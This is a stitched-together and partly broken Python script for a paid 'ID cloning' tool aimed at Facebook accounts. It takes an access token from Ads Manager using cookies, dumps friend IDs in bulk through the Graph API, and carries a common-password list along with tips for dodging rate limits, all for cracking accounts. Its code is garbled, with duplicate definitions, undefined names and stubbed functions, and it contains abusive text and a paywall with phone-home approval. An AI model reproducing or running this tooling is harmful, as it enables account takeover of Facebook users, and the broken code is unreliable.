import requests
from bs4 import BeautifulSoup
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.table import Table
from rich.console import Console
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from rich.panel import Panel
from rich.markdown import Markdown
from rich.columns import Columns
from rich import pretty
from rich.text import Text
from time import localtime
from rich.progress import track

def looood(x):
    for i in track(range(x), description="Loading..."):
        time.sleep(0.1)

import sys
import time

def slow(t):
    for e in t:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)
    print()


import sys
from time import sleep
import random
import requests

def type_text(t):
    for e in t + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        sleep(0.04)

# ANSI color codes
GREEN = '\033[92m'
YELLOW = '\033[33;1m'
WHITE = '\033[37;1m'
RESET = '\033[0m'

# Messages
JOIN_GROUP_MSG = f"{GREEN}{WHITE}[{GREEN}+{WHITE}] {GREEN}Join My Script Gift group....!"
FOLLOW_GITHUB_MSG = f"{GREEN}{WHITE}[{GREEN}+{WHITE}] {YELLOW}Follow My GitHub....!"
JOIN_FB_GROUP_MSG = f"{GREEN}{WHITE}[{GREEN}+{WHITE}] {YELLOW}Join My Official Facebook Group....!"
LOGIN_CREDENTIALS_MSG = f"{GREEN}{WHITE}[{GREEN}+{WHITE}] {GREEN}Username Is : {YELLOW}Mr {GREEN}| Password Is : {YELLOW}Fuck{GREEN} ....!"
LOGIN_PROMPT_USER = f"{GREEN}┏━{WHITE}[{GREEN}+{WHITE}] {GREEN}Enter Username :{WHITE} "
LOGIN_PROMPT_PASS = f"{GREEN}┗━{WHITE}[{GREEN}+{WHITE}] {YELLOW}Enter Password : {GREEN}"
LOGIN_SUCCESS_MSG = f"{GREEN}{WHITE}[{GREEN}+{WHITE}] {GREEN}You Haved Successfuly Loged In !"
LOGIN_FAIL_MSG = f"{WHITE}[{GREEN}+{WHITE}] {RED}Incorrect Pass Please Trying "

# User agents
user_agents = [
    'Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36',
    # ... (rest of the user agents)
]

def generate_user_agent():
    # Nokia Symbian user agent
    if random.randint(1, 2) == 1:
        model = f"Nokia{random.randint(100, 9999)}"
        browser_version = f"{random.randint(4, 9)}.{random.randint(0, 9)}"
        return f"Mozilla/5.0 (Symbian/3; Series60/5.0 {model}/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/{browser_version} Mobile Safari/535.1"
    
    # Android user agent
    else:
        android_version = random.choice(['6', '7', '8', '9', '10', '11', '12'])
        device = f"GT-{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}{random.randint(1000, 9999)}"
        chrome_version = f"{random.randint(73, 100)}.0.{random.randint(4200, 4900)}.{random.randint(40, 150)}"
        return f"Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36"

def main():
    type_text(JOIN_GROUP_MSG)
    type_text(FOLLOW_GITHUB_MSG)
    type_text(JOIN_FB_GROUP_MSG)
    type_text(LOGIN_CREDENTIALS_MSG)

    username = input(LOGIN_PROMPT_USER)
    password = input(LOGIN_PROMPT_PASS)

    if username == "Mr" and password == "Fuck":
        type_text(LOGIN_SUCCESS_MSG)
    else:
        type_text(LOGIN_FAIL_MSG)

    # Download proxy list
    proxy_url = 'https://raw.githubusercontent.com/ahmad77412/axi/main/.prox.txt'
    response = requests.get(proxy_url)
    with open('.prox.txt', 'w') as f:
        f.write(response.text)

    # Read proxies
    with open('.prox.txt', 'r') as f:
        proxies = f.readlines()

    # Example of using generated user agent
    user_agent = generate_user_agent()
    print(f"Generated User Agent: {user_agent}")

if __name__ == "__main__":
    main()

import requests
import re

def uaku():
    try:
        with open('tonmoy_ua.txt', 'r') as f:
            ua = f.read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a = requests.get('https://github.com/tonmoy404-cyber/FILE_X/blob/main/tonmoy_ua.txt').text
        with open('.tonmoy_ua.txt', 'w') as ua:
            aa = re.findall('line">(.*?)<', str(a))
            for un in aa:
                ua.write(un + '\n')
        with open('.tonmoy_ua.txt', 'r') as f:
            ua = f.read().splitlines()

# Color constants
W = '\033[1;97m'
R = '\033[1;91m'
G = '\033[1;92m'
Y = '\033[1;93m'
B = '\033[1;94m'
P = '\033[1;95m'
C = '\033[1;96m'
N = '\033[0m'

# Other constants
months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 
          'August', 'September', 'October', 'November', 'December']
days = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12']

import sys
import time
import os

def alvino_xy(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.005)

def clear():
    os.system('clear')

def back():
    login()

def contact():
    back()

def linex():
    print('\x1b[1;37m')

import sys
import time

def animation(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def slow(t):
    for e in t + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)

# The following strings are not part of a function but are just printed output
print('\x1b[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗')
print('║\x1b[0;91m ████████ \x1b[0;92m \x1b[0;92m██    ██  \x1b[0;91m███████ \x1b[0;92m █████  \x1b[0;91m ██████\x1b[0;92m ║')
print('║\x1b[0;91m    ██ \x1b[0;92m \x1b[0;92m   ██    ██  \x1b[0;91m██      \x1b[0;92m██   ██  \x1b[0;91m██   ██\x1b[0;92m║')
print('║\x1b[0;91m    ██ \x1b[0;92m \x1b[0;92m   ██    ██  \x1b[0;91m███████\x1b[0;92m ███████ \x1b[0;91m ██████\x1b[0;92m ║ ')
print('║\x1b[0;91m    ██ \x1b[0;92m \x1b[0;92m   ██    ██ \x1b[0;91m      ██ \x1b[0;92m██   ██  \x1b[0;91m██   ██\x1b[0;92m║')
print('║\x1b[0;91m    ██ \x1b[0;92m \x1b[0;92m    ██████   \x1b[0;91m███████ \x1b[0;92m██   ██  \x1b[0;91m██   ██\x1b[0;92m║')
print('\x1b[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \x1b[0;92m    ')
print('║\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m>\x1b[0;41m[ WORKING WIFI+MOBILE DATA ]\x1b[0;92m<\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m \x1b[0;91m\x1b[0;92m║')
print('\x1b[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝')
print('\x1b[34m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗')
print('\x1b[33m╠══[Author                   • MR-TUSAR ]     ║')
print('\x1b[31m╠══[Facebook                 • TUSAR King ]   ║')
print('\x1b[97m╠══[Github                   • TUSAR-King ]   ║')
print('\x1b[34m╠══[Whatsapp                 • 01745981329 ]  ║')
print('\x1b[35m╠══[TOOLS                    • PAID ]         ║')
print('\x1b[33m╠══[VERSION                  • 2.0 ]         ║')
print('\x1b[92m╠══[Key:\x1b[0;41m                      Your Key Not Approve       \x1b[0;92m║')
print('\x1b[34m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝')
print('\x1b[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n║\x1b[0;91m ████████ \x1b[0;92m \x1b[0;92m██    ██  \x1b[0;91m███████ \x1b[0;92m █████  \x1b[0;91m ██████\x1b[0;92m ║\n║\x1b[0;91m    ██ \x1b[0;92m \x1b[0;92m   ██    ██  \x1b[0;91m██      \x1b[0;92m██   ██  \x1b[0;91m██   ██\x1b[0;92m║\n║\x1b[0;91m    ██ \x1b[0;92m \x1b[0;92m   ██    ██  \x1b[0;91m███████\x1b[0;92m ███████ \x1b[0;91m ██████\x1b[0;92m ║ \n║\x1b[0;91m    ██ \x1b[0;92m \x1b[0;92m   ██    ██ \x1b[0;91m      ██ \x1b[0;92m██   ██  \x1b[0;91m██   ██\x1b[0;92m║\n║\x1b[0;91m    ██ \x1b[0;92m \x1b[0;92m    ██████   \x1b[0;91m███████ \x1b[0;92m██   ██  \x1b[0;91m██   ██\x1b[0;92m║\n\x1b[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \x1b[0;92m                                          \n\x1b[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n║\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m>\x1b[0;41m[ WORKING WIFI+MOBILE DATA ]\x1b[0;92m<\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m•\x1b[0;91m•\x1b[0;97m \x1b[0;91m\x1b[0;92m║\n\x1b[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\n\x1b[34m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n\x1b[33m╠══[Author                   • MR-TUSAR ]     ║\n\x1b[31m╠══[Facebook                 • TUSAR King ]   ║\n\x1b[97m╠══[Github                   • TUSAR-King ]   ║\n\x1b[34m╠══[Whatsapp                 • 01745981329 ]  ║\n\x1b[35m╠══[TOOLS                    • PAID ]         ║\n\x1b[33m╠══[VERSION                  • 2.0 ]         ║\n\x1b[34m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝')
print('\x1b[38;5;50m══════════════════════════════════════════════════')
print(' \x1b[0;97m=============================================')
print(' \x1b[32;1m[-] ONLY APPROVAL SYSTEM 7 DEYS 250TK 30 500TK FOR    APPROVAL')
print(' \x1b[32;1m[+] CONTACT ADMIN PLZ ENTAR')
print(' \x1b[32;1m[𝟷] 𝚈𝙾𝚄𝚁 Key 🔑 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿??𝙾𝚅𝙴𝙳')
print(' \x1b[32;1m[-] Importent Note ')
print(' \x1b[32;1m[𝟸] 𝙵𝚄𝙲𝙺 𝙱𝚈𝙿𝙰𝚂𝙰𝚁 𝙲𝙷𝙰𝙺𝙴 𝚈𝙾𝚄𝚁 𝙳𝙰𝚃𝙰 ')

import os
import requests
import time

def main():
    os.system('clear')
    print(logo)
    
    uuid = str(os.geteuid()) + '-' + str(os.getlogin())
    id = uuid
    
    httpCaht = requests.get('https://github.com/tusar497/Public-CloNing-42o/blob/main/Approval.txt').text
    
    if id in httpCaht:
        print(fuckyoursali())
        print(hedaborakarent())
        
        msg = str(os.geteuid())
        print()
        
        print('\x1b[1;39m[\x1b[1;32m●\x1b[1;39m] \x1b[1;32m15 Days 250 Taka \x1b[0;92m')
        print('\x1b[1;39m[\x1b[1;32m+\x1b[1;39m] \x1b[1;32m30 Days 400 Taka \x1b[0;92m')
        print('\x1b[1;39m[\x1b[1;32m●\x1b[1;39m] \x1b[1;32mCource + Comand 30 Days 1000 Taka \x1b[0;92m')
        print('\x1b[1;39m[\x1b[1;32m●\x1b[1;39m]\x1b[1;33m TUSAR ToOLs Daily Update)✅ \x1b[0;92m')
        print('\x1b[1;39m┏━[\x1b[1;32m●\x1b[1;39m] \x1b[1;32mNote : \x1b[0;41mByPass: User Fuck Your Mother):\x1b[0;92m')
        print('\x1b[1;39m┗━━━━━━━━━━━━\x1b[1;32mFREE USER NOT COME INBOX ??\x1b[0;92m')
        print('\x1b[1;39m[\x1b[1;32m●\x1b[1;39m] \x1b[1;36m==================== \x1b[0;92m')
        print('\x1b[1;39m[\x1b[1;32m+\x1b[1;39m] \x1b[1;33mFREE-FIRE-ID CLONING \x1b[0;92m')
        print('\x1b[1;39m[\x1b[1;32m●\x1b[1;39m] \x1b[1;32mONLY ACTIVE ID CLONING \x1b[0;92m')
        print('\x1b[1;39m[\x1b[1;32m+\x1b[1;39m] \x1b[1;33mUnActive id Not Allow \x1b[0;92m')
        print('\x1b[1;39m[\x1b[1;32m●\x1b[1;39m] \x1b[1;32mCp id Login 60% \x1b[0;92m')
        print('\x1b[1;39m[\x1b[1;32m+\x1b[1;39m] \x1b[1;33mWi-fi Working 80% \x1b[0;92m')
        print('\x1b[1;39m[\x1b[1;32m●\x1b[1;39m] \x1b[1;32mYour Key:\x1b[0;41m ' + id)
        input('\x1b[1;39m[\x1b[1;32m●\x1b[1;39m] \x1b[1;32mPress Enter To Send Key\x1b[0;92m')
        
        tks = 'Assalamu%20Alaikum🌺%20!%20Please%20Approve%20My%20Key%20TUSAR%20KiNg%20ToOLs%20:' + id
        os.system('am start https://wa.me/+8801834837550?text=' + tks)
        
        approval()
        time.sleep(1)
        meyexudi()
    else:
        print("ID not approved.")
        sys.exit()

if __name__ == "__main__":
    main()

import requests
import json

def print_separator():
    print('-------------------')

def back():
    login()

def login():
    try:
        with open('.token.txt', 'r') as f:
            token = f.read()
        
        with open('.cok.txt', 'r') as f:
            cok = f.read()
        
        tokenku.append(token)
        
        sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], cookies={'cookie': cok})
        sy2 = json.loads(sy.text)['name']
        sy3 = json.loads(sy.text)['id']
        
        menu(sy2, sy3)
    
    except KeyError:
        login_lagi334()
    
    except requests.exceptions.ConnectionError:
        print('\x1b[0;97m=================')
        animation(' [×] NO INTERNET CONNECTION DETECTED')
        exit()
    
    except IOError:
        login_lagi334()

import os
import requests
import re
import sys
import time

def login_lagi334():
    os.system('clear')
    print(logo)
    ses = requests.Session()
    cookies = {'cookie': ''}
    url = 'https://www.facebook.com/adsmanager/manage/campaigns'
    
    req = ses.get(url, cookies=cookies)
    set = re.search('act=(.*?)&nav_source', str(req.content)).group(1)
    nek = f"{url}?act={set}&nav_source=no_referrer"
    
    roq = ses.get(nek, cookies=cookies)
    tok = re.search('accessToken="(.*?)"', str(roq.content)).group(1)
    
    with open('.token.txt', 'w') as tokenw:
        tokenw.write(tok)
    
    with open('.cok.txt', 'w') as cokiew:
        cokiew.write(cookies['cookie'])
    
    return None

def jalan():
    pass

def __init__(self, z):
    self.z = z
    sys.stdout.write('\n')
    sys.stdout.flush()
    time.sleep(0.04)

import os
import sys
import time
from datetime import datetime

def slow(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.04)

def menu():
    os.system('clear')
    print(logo)
    slow(f'\x1b[97;1m[\x1b[92;1m+\x1b[97;1m] \x1b[1;92mUSER NAME\x1b[1;91m :\x1b[1;96m {uname()}')
    slow(f"\x1b[97;1m[\x1b[92;1m•\x1b[97;1m] \x1b[0;93mTODAY'S DATE :\x1b[1;92m {datetime.now().strftime('%Y-%m-%d')}")
    slow('\x1b[0;97m===============================================')
    slow('\x1b[97;1m[\x1b[92;1m1\x1b[97;1m] \x1b[0;92mFILE CLONING         ')
    slow('\x1b[97;1m[\x1b[92;1m2\x1b[97;1m] \x1b[0;93mCONTACT WITH ADMIN')
    slow('\x1b[97;1m[\x1b[92;1m3\x1b[97;1m] \x1b[92;1mCHECK OK IDz   ')
    slow('\x1b[97;1m[\x1b[92;1m0\x1b[97;1m] \x1b[0;91mEXIT')
    slow('\x1b[1;92m[+] CHOOSE: ')
    
    TUSAR = input()
    
    if TUSAR in ('111',):
        login()
        dump_massal()
        return None
    elif TUSAR in ('1',):
        crack_file()
        return None
    elif TUSAR in ('C', '02'):
        os.system('xdg-open https://wa.me/+8801646607743')
        os.system('python nono.py')
        return None
    elif TUSAR in ('3', '03'):
        result()
        return None
    elif TUSAR in ('0',):
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\x1b[0;97m===============================================')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\x1b[0;97m===============================================')
        animation(' [×] SELECT CORRECTLY ')
        back()
        return None

import os
import time

def animation(message):
    print(message)

def back():
    pass

def logo():
    pass

def main():
    os.system('clear')
    print(logo())
    print(' \x1b[97;1m[\x1b[92;1m1\x1b[97;1m] CHECK CP IDZ ')
    print(' \x1b[97;1m[\x1b[92;1m2\x1b[97;1m] CHECK OK IDZ ')
    print(' \x1b[97;1m[\x1b[92;1m3\x1b[97;1m] EXIT ')
    print('\x1b[0;91m===============================================')
    kz = input(' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m]CHOOSE : ')

    if kz in ('1', '01'):
        try:
            vin = os.listdir('CP')
        except FileNotFoundError:
            print('\x1b[0;91m===============================================')
            animation(' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] FILE NOT FOUND ')
            time.sleep(3)
            back()
            return

        if len(vin) == 0:
            print('\x1b[0;91m===============================================')
            animation(' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] NO CP RESULTS FOUND ')
            time.sleep(2)
            back()
            return

        cih = 0
        lol = {}
        for isi in vin:
            try:
                with open(f'CP/{isi}', 'r') as file:
                    hem = file.readlines()
            except:
                continue

            cih += 1
            if cih < 10:
                nom = '' + str(cih)
                lol.update({str(cih): str(isi)})
                lol.update({nom: str(isi)})
                print('\x1b[0;91m===============================================')
                print(' ' + nom + '. ' + isi + '\x1b[31m ' + str(len(hem)) + ' \x1b[0m CP ')
            else:
                lol.update({str(cih): str(isi)})
                print(' ' + str(cih) + '. ' + isi + '\x1b[31m ' + str(len(hem)) + ' \x1b[0m CP ')

        print('\x1b[0;91m===============================================')
        geeh = input(' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] CHOOSE : ')

import os
import time

def main():
    try:
        geh = lol[geeh]
    except KeyError:
        print('\x1b[0;91m===============================================')
        animation(' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] NO OPTION FOUND ')
        exit()

    try:
        with open('CP/' + geh, 'r') as file:
            lin = file.read().splitlines()
    except FileNotFoundError:
        print('\x1b[0;91m==================')
        animation(' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] FILE NOT FOUND ')
        time.sleep(2)
        back()

    nocp = 0
    for cpku in range(len(lin)):
        cpkuni = lin[nocp].split('|')
        print(f' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] CP : \x1b[33m {cpkuni[0]}|{cpkuni[1]}\x1b[0m')
        nocp += 1

    print('\x1b[0;91m==================')
    input('\x1b[97;1m[\x1b[92;1m•\x1b[97;1m] PRESS ENTER TO BACK ')
    back()

    if kz in ('2', '02'):
        try:
            vin = os.listdir('OK')
        except FileNotFoundError:
            print('\x1b[0;91m==================')
            animation(' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] FILE NOT FOUND ')
            time.sleep(2)
            back()

        if len(vin) == 0:
            print('\x1b[0;91m==================')
            animation(' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] NO OK RESULTS FOUND ')
            time.sleep(2)
            back()

    cih = 0
    lol = {}
    for isi in vin:
        with open('OK/' + isi, 'r') as file:
            hem = file.readlines()

import time

while True:
    cih += 1
    if cih < 100:
        print('\x1b[0;91m==================')
        nom = str(cih) + ''
        lol.update({str(cih): str(isi)})
        lol.update({nom: str(isi)})
        print(' ' + nom + '. ' + str(isi) + '\x1b[32m ' + str(len(hem)) + ' \x1b[0m OK ' + str(x))
        continue

    print('\x1b[0;91m==================')
    geeh = input(' \x1b[1;92m [•] CHOOSE : ')
    print('\x1b[0;91m==================')
    
    try:
        geh = lol[geeh]
    except KeyError:
        print('\x1b[0;91m==================')
        animation(' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] NO OPTION FOUND ')
        exit()

    with open('OK/' + geh, 'r') as file:
        lin = file.read().splitlines()

    try:
        # Additional processing with lin
        pass
    except Exception:
        print('\x1b[0;91m==================')
        animation(' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] FILE NOT FOUND ')
        time.sleep(2)
        back()

import requests
import json
import os
import time

def dump_massal():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except IOError:
        exit()

    print('\x1b[0;91m==================')
    try:
        jum = int(input(' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] ENTER TARGET AMOUNT  : '))
    except ValueError:
        print(' [×] INVALID OPTION ')
        exit()

    if jum < 1 or jum > 100000000:
        print(' [×] TRY AGAIN ')
        exit()

    ses = requests.Session()
    yz = 0
    for met in range(jum):
        yz += 1
        kl = input(f' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] INPUT UID {yz} : ')
        userr = ses.get(f'https://graph.facebook.com/v2.0/{kl}?fields=friends.limit(5000)&access_token={token}', cookies={'cookies': cok}).json()
        
        for pi in userr['friends']['data']:
            try:
                col = pi['id'] + '|' + pi['name']
                if col in id:
                    pass
                else:
                    id.append(col)
            except KeyError:
                continue
            except requests.exceptions.ConnectionError:
                print(' [×] DUMP ID FAILED ')
                exit()

    os.system('clear')
    print('\x1b[0;91m==================')
    print(f' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] TOTAL ID : \x1b[36m{len(id)}')
    print('\x1b[1;37m')
    setting()

    mi = input('\x1b[97;1m[\x1b[92;1m•\x1b[97;1m] PRESS ENTER TO BACK ')
    back()

    if mi in ['0', '00']:
        back()
    
    print('\x1b[0;91m==================')
    animation(' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] NO OPTION FOUND IN MENU')
    exit()

def animation(text):
    for i in text:
        print(i, end='', flush=True)
        time.sleep(0.03)

import json
import requests

try:
    with open('.token.txt', 'r') as file:
        token = file.read()
    with open('.cok.txt', 'r') as file:
        cok = file.read()
except IOError:
    exit()

print('\x1b[0;91m==================')
jum = int(input(' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] ENTER TARGET AMOUNT  : '))
print('\x1b[0;91m==================')

while True:
    try:
        if jum < 1 or jum > 100000000:
            print('\x1b[0;91m==================')
            animation(' [×] TRY AGAIN ')
            exit()
        
        ses = requests.Session()
        yz = 0
        uid = []

        for met in range(jum):
            yz += 1
            kl = input(' \x1b[97;1m[\x1b[92;1m•\x1b[97;1m] INPUT UID ' + str(yz) + ' : ')
            uid.append(kl)

        for userr in uid:
            response = ses.get('https://graph.facebook.com/v2.0/' + userr + '?fields=friends.limit(5000)&access_token=' + tokenku[0] + cok)
            col = response.json()
            for mi in col['friends']['data']:
                iso = mi['id'] + '|' + mi['name']
                if id not in iso:
                    id.append(iso)
    except ValueError:
        print('\x1b[0;91m==================')
        animation(' [×] INVALID OPTION ')
        exit()
    except KeyError:
        continue

import os
import requests
import time

def crack_file():
    try:
        # Your code logic here
        pass
    except requests.exceptions.ConnectionError:
        print('\x1b[0;91m==================')
        print(' [×] TRY AGAIN ')
        os.system('clear')
        return None
    except KeyError:
        pass
    except IOError:
        print('\x1b[0;91m==================')
        print(' [×] DUMP ID FAILED ')
        time.sleep(3)
        return None
    return None

import os
import time
import random

os.system('clear')
print(logo)
os.system('espeak -a 300 " your file name"')
print('\x1b[10;92m┏━\x1b[37;1m[\x1b[10;92m+\x1b[37;1m] \x1b[37;1m[EXAMPLE \x1b[10;92m• \x1b[10;92m/sdcard/File.txt  Etc...]')
o = input('\x1b[10;92m┗━\x1b[37;1m[\x1b[10;92m+\x1b[37;1m] YOUR FILE NAME \x1b[10;92m• \x1b[37;1m ')

try:
    with open(o) as file:
        lin = file.read().splitlines()
except FileNotFoundError:
    animation(' [×] FILE NOT FOUND')
    time.sleep(2)
    back()

for xid in lin:
    id.append(xid)

setting()

import random

def main():
    bacot = []
    while True:
        for item in bacot:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
        
        print('\x1b[10;92m┏━\x1b[10;97m=============================')
        print('\x1b[1;91m┣━\x1b[10;97m[\x1b[10;92m1\x1b[10;97m]\x1b[1;93mCOOCKIE SHOW')
        print('\x1b[1;92m┣━\x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m \x1b[0;93mWITHOUT COOCKIE')
        
        hc = input('\x1b[10;92m┗━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m]\x1b[10;92m CHOOSE \x1b[10;91m•\x1b[10;97m : ')
        
        if hc in ('1', '01'):
            method.append('mobile')
        else:
            break

import os

def passwrd():
    if ('2', '02') in method:
        method.append('free')
    else:
        method.append('mobile')
    
    NULL()  # Assuming NULL is a function defined elsewhere
    exit()  # Assuming exit is a function defined elsewhere
    return None

# Locals
pool = None
yuzong = None
idf = None
nmf = None
frs = None
pwv = None
xpwd = None
woi = None

# Constants
CLEAR = None
PROMPT = 'clear'
HEADER = '\x1b[10;92m┏━\x1b[10;97m============================================='
USER_NAME_PROMPT = '\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m]\x1b[38;5;208m USER NAME\x1b[10;91m :\x1b[1;96m '
TOTAL_IDZ = '\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mTOTAL IDz •\x1b[10;97m '
STARTING_TIME = '\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mSTARTING TIME •\x1b[10;97m '
FLIGHT_MODE_NOTICE = '\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[38;5;196mUse Flight Mode In Every 10 Minutes💚'
OK_IDZ_SAVED = '\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;94mYOUR OK IDz SAVED\x1b[10;91m • \x1b[10;93m/sdcard/TUSAR•Ok💚.txt'
FOOTER = '\x1b[10;92m┗━\x1b[10;97m============================================='
MAX_WORKERS = 30
PIPE = '|'
ZERO = 0
ONE = 1
SPACE = ' '
SIX = 6
THREE = 3
TWELVE = '12'
ONE_HUNDRED_TWENTY_THREE = '123'
ONE_THOUSAND_TWO_HUNDRED_THIRTY_FOUR = '1234'
ONE_HUNDRED_TWENTY_THREE_FOUR_FIVE = '12345'
ONE_HUNDRED_TWENTY_THREE_FOUR_FIVE_SIX = '123456'
I_LOVE_YOU = 'i love you'
AT_SYMBOL = '@'
DOUBLE_AT_SYMBOL = '@@'
TRIPLE_AT_SYMBOL = '@@@'
QUADRUPLE_AT_SYMBOL = '@@@@'
ONE_FORTY_THREE = '143'
ONE_ONE_TWO_TWO = '1122'
ONE_STRING = '1'
ELEVEN_STRING = '11'



